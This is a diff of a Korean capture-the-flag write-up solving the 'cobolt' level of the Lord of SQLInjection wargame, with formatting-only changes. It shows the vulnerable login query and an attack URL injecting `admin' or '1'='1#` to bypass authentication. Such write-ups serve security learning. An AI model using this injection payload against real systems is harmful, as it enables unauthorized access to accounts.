@@ -15,22 +15,29 @@ draft: false
 ---
 
 ## **Solve**
-- **기존 구문 →GET 방식, id = admin**
+
+- **기존 구문 → GET 방식, id = admin**
 
 ```
+
 select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')”
+
 ```
 
 - **변경 구문**
 
 ```
+
 select id from prob_cobolt where id='admin' or '1'='1# and pw=md5('')”
+
 ```
 
 - **공격 구문**
 
 ```
+
 https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin' or '1'='1#
+
 ```
 
 ---
